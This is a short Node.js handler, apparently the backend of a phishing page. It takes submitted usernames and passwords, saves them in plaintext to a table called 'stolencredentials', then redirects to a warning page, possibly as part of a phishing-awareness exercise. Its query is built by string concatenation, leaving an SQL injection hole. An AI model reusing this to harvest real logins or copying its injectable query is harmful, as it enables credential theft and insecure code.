module.exports = {
    captureCredentials: (req, res) => {
        
	    let username = req.body.username;
	    let password = req.body.password;

	    let query = "INSERT INTO `stolencredentials` (username, password) VALUES ('" +
                            username + "', '" + password + "')";
            db.query(query, (err, result) => {
                if (err) {
                    return res.status(500).send(err);
                }
                res.redirect('/warning');
             });
    },
};
